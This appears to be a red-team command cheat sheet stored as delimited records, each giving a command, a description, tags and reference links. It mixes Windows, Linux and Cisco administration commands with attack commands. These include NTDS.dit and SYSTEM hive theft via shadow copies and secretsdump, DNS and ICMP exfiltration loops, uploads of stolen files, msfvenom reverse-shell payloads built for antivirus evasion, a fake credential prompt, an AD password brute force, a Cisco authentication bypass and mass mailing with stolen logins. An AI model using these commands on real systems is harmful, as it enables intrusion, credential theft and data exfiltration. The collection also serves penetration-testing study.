https://technet.microsoft.com/en-us/library/bb490719.aspx
EOR
net share
current smb shares
EOC
Windows
enumeration
EOT
https://technet.microsoft.com/en-us/library/bb490712.aspx
https://technet.microsoft.com/en-us/library/bb490949.aspx
EOR
net session
active sessions
EOC
Windows
smb
enumeration
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
EOR
net share [sharename] [folder] /GRANT:Everyone,FULL
Share a directory with the world, probably don't want the world
EOC
Windows
Files
smb
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
EOR
sc \\[victim] create [name] binpath=[pathtoexe] start= auto
Create a service on remote machine
EOC
Windows
EOT
https://technet.microsoft.com/en-gb/library/bb490995.aspx
https://technet.microsoft.com/en-us/library/cc990289(v=ws.11).aspx
EOR
xcopy /s \\[victim] \dir [directory]
copy a remote file to lcwd
EOC
Windows
Files
EOT
https://technet.microsoft.com/en-gb/library/bb491035.aspx
EOR
shutdown /m \\[victim] /r /t 0 /f
remote shutdown
EOC
Windows
EOT
https://technet.microsoft.com/en-gb/library/bb491003.aspx
EOR
ipconfig /displaydns
show dnscache
EOC
Windows
networking
dns
enumeration
forensics
EOT
https://technet.microsoft.com/en-gb/library/bb490921.aspx
EOR
netstat -anop | findstr LISTEN
listening ports
EOC
Windows
networking
enumeration
EOT
https://technet.microsoft.com/en-us/library/cc940097.aspx
https://technet.microsoft.com/en-us/library/bb490947.aspx
EOR
tftp -I [victim] GET [file]
download a file, no longer default
EOC
Windows
Files
EOT
https://technet.microsoft.com/en-gb/library/bb491014.aspx
EOR
netsh interface ip show
show interface information
EOC
Windows
networking
enumeration
EOT
https://technet.microsoft.com/en-us/library/bb490939.aspx
EOR
netsh interface ip set address local static [ip] [mask] [gw] [ID]
set static ip
EOC
Windows
networking
configuration
EOT
https://technet.microsoft.com/en-us/library/bb490939.aspx
EOR
netsh interface ip set dns local static [ip]
set DNS server
EOC
Windows
networking
configuration
EOT
https://technet.microsoft.com/en-us/library/bb490939.aspx
EOR
netsh interface ip set address local dhcp
enable DHCP
EOC
Windows
networking
configuration
EOT
https://technet.microsoft.com/en-us/library/bb490939.aspx
EOR
makecab [file]
compress file
EOC
Windows
Files
EOT
https://technet.microsoft.com/en-us/library/hh875545(v=ws.11).aspx
EOR
wusa.exe /uninstall /kb: [id]
uninstall patch : 2871997
EOC
Windows
interesting
EOT
https://support.microsoft.com/en-gb/help/934307/description-of-the-windows-update-standalone-installer-in-windows
EOR
rundll32.dll user32.dll LockWorkstation
lock the workstation
EOC
Windows
interesting
EOT
https://technet.microsoft.com/en-us/library/ee649171(v=ws.11).aspx
EOR
netsh advfirewall set currentprofile state off;netsh advfirewall set allprofiles state off;
disable local firewall
EOC
Windows
networking
configuration
EOT
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/dd734783(v=ws.10).aspx
EOR
reg add HKCU\Software\Policies\microsoft\Windows\System /v DisableCHD /t
re-enable CMD
EOC
Windows
pivoting
configuration
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file]
windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash
EOC
Windows
pivoting
remote command shell
EOT
https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx
EOR
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer" /v DenyTSConnections /t REG_DWORD /d 0 /f
enable RDP
EOC
Windows
configuration
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
Disable NLA on RDP
EOC
Windows
configuration
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
wmic startupwmic service
start wmic service
EOC
Windows
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic process list full
list all processes
EOC
Windows
process management
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic ntdomain list
Domain and DC info
EOC
Windows
enumeration
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic qfe
list patches
EOC
Windows
enumeration
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://www.fuzzysecurity.com/tutorials/16.html
EOR
wrnic process call create "[cmd]"
execute command
EOC
Windows
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic process where name="[cmd]" call terminate
kill process
EOC
Windows
process management
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic logicaldisk get description,name
view logical shares
EOC
Windows
enumeration
filesystem
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create "\\[host]\[share]\[exe]"
execute command on remote host from remote smb share
EOC
Windows
smb
remote command shell
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic /node:[victim] computersystern get username
get logged in users from the remote host
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic /node:[victim] process list brief /every:1
list remote processes every second
EOC
Windows
enumeration
process management
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic /node:"[victim]" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
enble rdp on remote host
EOC
Windows
configuration
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic netlogin where (name like "%[user]%") get numberoflogons
How many times has someone logged in
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
unquoted service path search add node for remote sys
EOC
Windows
enumeration
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
EOR
wmic /node:[victim] /user:"[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin list shadows 2 &1 >> c:\temp\vss.txt"
List volume shadow copies
EOC
Windows
hashes
EOT
https://yg.ht
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
EOR
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin create shadow /for=C: 2 &1 >> C:\temp\create_vss.txt"
create volume shadow copy for c
EOC
Windows
hashes
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
EOR
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\Windows\System32\config\SYSTEM c:\temp\SYSTEM" 2 &1 >> c:\temp\copy_system.txt
copy system out of a volume shadow copy
EOC
Windows
hashes
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
EOR
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\NTDS\NTDS.dit c:\temp\ntds.dit" 2 &1 >> c:\temp\copy_ntds.txt
copy out ntds from the voulme shadow copy
EOC
Windows
hashes
EOT
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
EOR
secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes
Parse the SYSTEM and ntds with impacket
EOC
Windows
hashes
impacket
EOT
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
EOR
invoke-webrequest
powershell wget
EOC
Windows
Files
powershell
EOT
https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
EOR
wget
also powershell wget
EOC
Windows
Files
powershell
EOT
https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
EOR
(new-object system.net.webclient).downloadFile("[url]","[dest]")
also powershell wget
EOC
Windows
Files
powershell
EOT
https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
EOR
get-content
powershell type file
EOC
Windows
Files
powershell
EOT
https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-content
EOR
get-service
powershell services
EOC
Windows
powershell
process management
EOT
https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-service
EOR
get-psdrive
list of drives : cd Env:\ . . . mind . . . blown
EOC
Windows
interesting
enumeration
powershell
configuration
EOT
https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-psdrive
EOR
get-help
RTFM *cough*
EOC
Windows
powershell
EOT
https://technet.microsoft.com/en-us/library/ee176848.aspx
EOR
get-wmiobject -list 'netework'
list interfaces with wmi
EOC
Windows
powershell
EOT
https://technet.microsoft.com/en-us/library/ee176860.aspx
https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-wmiobject
EOR
[Net.DNS]::GetHostEntry("ip")
get dns addr tab after :: for more choices
EOC
Windows
dns
powershell
EOT
https://msdn.microsoft.com/en-us/library/ms143998(v=vs.110).aspx
EOR
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
get system information
EOC
Windows
enumeration
powershell
EOT
http://www.energizedtech.com/2010/03/powershell-check-your-windows.html
EOR
New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i
powershell mount remote share : think sysinternals remote share
EOC
Windows
Files
smb
powershell
EOT
https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/new-psdrive
EOR
Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2017-01-13"}
txt files changed after the 13 Jan 2017
EOC
Windows
Files
powershell
forensics
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
powershell port scanning
EOC
Windows
loop
networking
interesting
scanning
powershell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
$ping = New-Object System.Net.Networkinformation.ping;$ping.Send("[ip]",50O);
Ping ip with timeout of 500
EOC
Windows
networking
powershell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential("[title]","[message]","[user]","[domain]")
Ask user for credentials
EOC
Windows
passwords
powershell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
powershell.exe -Command "do {if ((Get-Date -format yyyymmdd-HHmm) -match '201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden "[exe]";Start-Sleep -s 14400}}while(1)"
powershell run on schedule, match says when run
EOC
Windows
powershell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
powershell.exe Send-MailMessage -to "[victim]" -from "[from]" -subject "[subject]" -a "[Attach file path]" -body "[Body]" -SmtpServer [ServerIP]
Powershell send an email
EOC
Windows
interesting
powershell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
Get-WmiObject -ComputerName [DC] -Namesapce root\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter "domainname='[domain]' | select textrepresentation
list hostname and ip for domain pc's
EOC
Windows
dns
enumeration
powershell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
Powershell upload file VIA post, script must write this out
EOC
Windows
Files
networking
interesting
powershell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1
powershell shell
EOC
metasploit
av evasion
powershell
EOT
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
EOR
HKLM\Software\Microsoft\Windows NT\CurrentVersion
Windows information in the reg
EOC
Windows
enumeration
forensics
EOT
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
EOR
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU
Mapped drives in reg
EOC
Windows
smb
enumeration
forensics
EOT
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
EOR
HKLM\System\MountedDevices
Mounted devices
EOC
Windows
forensics
EOT
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
EOR
HKLM\System\CurrentControlSet\Enum\USBStor
USB Devices
EOC
Windows
forensics
EOT
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
EOR
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter
enable ip routing in windows, use as GW
EOC
Windows
configuration
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
HKLM\Security\Policy\PolAdTev
Audit policy
EOC
Windows
forensics
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
Kernel or User Services
EOC
Windows
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
HKLM|HKCU\Software
Machine or User software
EOC
Windows
enumeration
forensics
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
Recent Documents
EOC
Windows
enumeration
forensics
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU & \OpenSaveMRU
Recent user location (MRU Most Recntly used)
EOC
Windows
enumeration
forensics
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
HKCU\Software\Microsoft\Internet Explorer\TypedURLs
Typed Urls
EOC
Windows
dns
enumeration
forensics
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
dsquery user -limit 0
list users
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
EOR
dsquery group "cn=users,dc=[domain],dc=[tld]"
List groups for domain.com
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
EOR
dsquery group -name "domain admins" | dsget group -members -expand
Get Domain admins (prefer net groups "domain Admins")
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
EOR
dsquery user -name [user] | dsget user -memberof -expand
get groups for user (net groups [user])
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
EOR
dsquery user -name [user] | dsget user -samid
get user login name
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
EOR
dsquery user -inactive 2
List accounts that have been inactive for two weeks
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
EOR
dsquery * "DC=[domain],DC=[tld]" -scope subtree -attr "cn" "opperatingSystem"
List os's in the domain
EOC
Windows
enumeration
EOT
https://technet.microsoft.com/en-us/library/cc731823(v=ws.11).aspx
EOR
dsquery site -o rdn -limit 0
list site names
EOC
Windows
enumeration
EOT
https://technet.microsoft.com/en-us/library/cc731823(v=ws.11).aspx
EOR
dsquery subnet -site [site] -o rdn
list subnets within the sites shown
EOC
Windows
networking
enumeration
EOT
https://technet.microsoft.com/en-us/library/cc732207(v=ws.11).aspx
EOR
dsquery server -site [site] -o rdn
list servers within site
EOC
Windows
dns
enumeration
EOT
https://technet.microsoft.com/en-us/library/cc732885(v=ws.11).aspx
EOR
host [domain]
list DC's
EOC
Linux
dns
enumeration
EOT
https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
EOR
https://hashcat.net/wiki/doku.php?id=example_hashes
hash list
EOC
hashes
web address
EOT
https://hashcat.net/wiki/doku.php?id=example_hashes
EOR
Function Test-ADAuthentication {param($username,$password);echo "$username $password";(new-object directoryservices.directoryentry"",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content "user_logins.txt"){Test-ADAuthentication $userName password >> test4.txt;}
Simple powershell brute force, user input list, checks the password 'password'
EOC
Windows
loop
brute
powershell
EOT
https://msdn.microsoft.com/en-us/library/system.directoryservices.directoryentry(v=vs.110).aspx
http://serverfault.com/questions/596602/powershell-test-user-credentials-in-ad-with-password-reset
EOR
common ports
see /etc/services
EOC
Linux
networking
interesting
EOT
https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
EOR
TTL: 128 = Windows | 64 = linux | 255 = generic OR solaris
Networking Time to Live
EOC
networking
interesting
EOT
https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-window-sizes/
EOR
Window Size: 5840 = Linux | 5720 = Google Nix | 65535 = XP or BSD | 8192 = Visa and above | 4128 = Cisco Router
Networking Time to Live
EOC
reference
networking
interesting
EOT
https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-window-sizes/
EOR
Class Ip ranges : Go away, there was ABCDE. WAS AS IN NOT ANY MORE!
Classfull networks have not existed since 1993 cisco GTFO with telling people they exist
EOC
networking
interesting
EOT
https://en.wikipedia.org/wiki/Classful_network
EOR
Subnet ranges : /20 255.255.240.0 4096 hosts
please use ipcalc, there is no l33tness in doing it in your head
EOC
reference
networking
subnets
EOT
https://www.aelius.com/njh/subnet_sheet.html
EOR
ipcalc -bnmp 10.0.0.1/20
Ip subnets
EOC
Linux
networking
subnets
reference
EOT
https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
EOR
socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080
Route IPV6 through ipv4 for things that don't support it
EOC
Linux
networking
EOT
https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
EOR
enable
raise privs cisco
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
conf t
start configuration
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
show session
show sessions
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
show version
show version
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
show running-config
show the config which is running in flash, looking for password 7 and the like
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
show startup-config
show the config which runs on start up
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
show ip interface
show interface information : add breif for less
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
show ip route
show the routes of the switch
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
show access-lists
show the ACL for the switch
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/command/reference/ffun_r/frf001.html
EOR
http://[ip]/level/56/exec/show/config
Bypass auth on ios 11.2-12.2
EOC
cisco
interesting
web appplication
remote command shell
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
file2cable -i eth0 -f [file]
replay packets to network
EOC
Linux
networking
packet capture
EOT
http://manpages.ubuntu.com/manpages/xenial/man1/file2cable.1.html
EOR
dnsrecon -t rvs -i 10.0.0.1,10.0.0.255
Reverse look up on range
EOC
Linux
scanning
dns
EOT
https://github.com/darkoperator/dnsrecon
EOR
dnsrecon -t std -d [domain]
brute names
EOC
Linux
scanning
dns
EOT
https://github.com/darkoperator/dnsrecon
EOR
dnsrecon -t axfr -d [domain]
do a zone transfer request (just use host . . .)
EOC
Linux
networking
dns
enumeration
EOT
https://github.com/darkoperator/dnsrecon
EOR
ftp -s ftp.txt
uninteractive FTP, read commands from file
EOC
Windows
Files
interesting
EOT
https://technet.microsoft.com/en-gb/library/bb490910.aspx
EOR
for line in `base64 -w 230 [file]`; do host $line.[hostname]; done
exfil file through DNS, may want to encrypt, also assuming you have a short domain
EOC
Linux
loop
bash
interesting
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done
look for a free short domain, good luck
EOC
Linux
loop
networking
dns
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
for line in `base64 -w 1000 [file]`; do ping -s 1000 -c 1 -M do [ip]; done
Exfil over icmp
EOC
Linux
loop
networking
interesting
EOT
https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
EOR
fpipe.exe -l [lport] -r [rip] [ip]
forward local traffic htting lport to [rip]:[rport]
EOC
Windows
networking
pivoting
EOT
https://www.mcafee.com/uk/downloads/free-tools/fpipe.aspx
http://exploit.co.il/hacking/pivoting-into-a-network-using-plink-and-fpipe/
EOR
socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport]
forward local traffic htting lport to [rip]:[rport]
EOC
Linux
networking
EOT
https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
EOR
for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done
tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app
EOC
Linux
loop
bash
networking
interesting
scanning
EOT
http://tldp.org/LDP/abs/html/devref1.html
EOR
ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip]
ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1
EOC
Linux
networking
pivoting
EOT
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
EOR
plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip]
ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1
EOC
Windows
networking
pivoting
EOT
http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html
EOR
ssh -D [port] [user]@[ip]
set up a socks proxy
EOC
Linux
networking
pivoting
EOT
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
EOR
msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_ni -i 5 LHOST=[lhost] LPORT=[lport] evil.exe
create a evil calc
EOC
metasploit
av evasion
EOT
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
EOR
ettercap -TP rand_flood
try to make the switch fall over, and turn into a hub
EOC
Linux
MitM
EOT
https://linux.die.net/man/8/ettercap_plugins
EOR
hash lengths : MD5=16 | SHA1=20 | SHA256=32 | SHA512=64
Hash byte lengths
EOC
hashes
reference
EOT
https://en.wikipedia.org/wiki/List_of_hash_functions
EOR
for i in *; do pdfinfo $i | egrep -i "Auth"; done  | sort
generate user list from PDF's, you can get more info to such as pdf maker
EOC
loop
interesting
enumeration
user information
recon
EOT
http://linuxcommand.org/man_pages/pdfinfo1.html
EOR
for i in `cat dets`; do echo "Sening Spam from $i"; mailx -s "Report Attached" -r "`echo $i | awk -F @ '{print $1}'`<`echo $i | awk -F : '{print $1}'`>" -a report.pdf -S smtp-auth=login -S smtp-auth-user="`echo $i | awk -F : '{print $1}'`" -S smtp-auth-password="` echo $i | awk -F : '{print $2}'`" -S ssl-verify=ignore -v -S smtp="10.11.1.229" [victim] < email;echo _________; done
Loop around 'dets' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in 'email'
EOC
loop
networking
interesting
EOT
http://www.binarytides.com/linux-mailx-command/
EOR
https://gchq.github.io/CyberChef/
Common operations on data
EOC
interesting
reference
web address
EOT
https://gchq.github.io/CyberChef/
EOR
schtasks /query /fo LIST /v
List windows scheduled tasks, older windows defender
EOC
Windows
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
EOR
wmic qfe get Caption,Description,HotFixID,InstalledOn
list installed patches on windows
EOC
Windows
privilege escalation
enumeration
EOT
http://www.fuzzysecurity.com/tutorials/16.html
EOR
reg query [HKCU|HKLM]\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
Do MSI's have admin rights?
EOC
Windows
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
EOR
echo %path%
show the current path to see if we can subvert anything
EOC
Windows
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
EOR
sc sdshow  winmgmt
Show service permissions, look for AU|AN|DU|LG|
EOC
Windows
privilege escalation
EOT
http://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-windows/
EOR
nmblookup [name]
Do a netbios name query.
EOC
smb
scanning
linux
EOT
http://linuxcommand.org/man_pages/nmblookup1.html
EOR
export PS1="# \A:\[$(tput sgr0)\]\[\033[38;5;1m\]\u:\W:\[$(tput sgr0)\] "
Pretty terminal PS1 that is copy n paste safe
EOC
linux
bash
EOT
http://bashrcgenerator.com/
EOR
apropos [keyword]
search the manual page names and descriptions
EOC
linux
interesting
EOT
http://www.thegeekstuff.com/2009/11/5-methods-to-get-quick-help-on-linux-commands/
EOR
sntp [ip]
Query the remote ntp time
EOC
linux
networking
EOT
http://doc.ntp.org/4.2.6/sntp.html
EOR
host -t axfr [ip]
Ask for a zone transfer
EOC
linux
networking
enumeration
EOT
https://tools.ietf.org/html/rfc5936
EOR
rusers -al [ip]
show users rlogin
EOC
enumeration
linux
EOT
http://linuxcommand.org/man_pages/rusers1.html
EOR
net use z:\ \\[ip]\[share] /user:[domain]\[username] [password] /p:no [password]
mount a share within windows
EOC
windows
smb
EOT
https://technet.microsoft.com/en-us/library/bb490717.aspx
EOR
samrdump.py -hashes [LMHASH:NTHASH] [user]:[pass]@[victim]
List users of the remote system
EOC
enumeration
linux
impacket
EOT
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
EOR
rlogin -l [user] [target]
Login using rlogin : Not installed by default
EOC
linux
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
finger @[ip]
Show remote users using finger : Not installed by default? : use 0@[ip] for Solaris bug
EOC
linux
enumeration
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
tnscmd10g version -h [victim]
Fingerprint remote oracle server
EOC
oracle
enumeration
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
http://cyborg.ztrela.com/tnscmd10g.php/
EOR
CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate 'grant dba to user1 identified by pass1'; commit; return 'FOO'; end;
Get Current user oracle DB : CMD new lines removed
EOC
oracle
enumeration
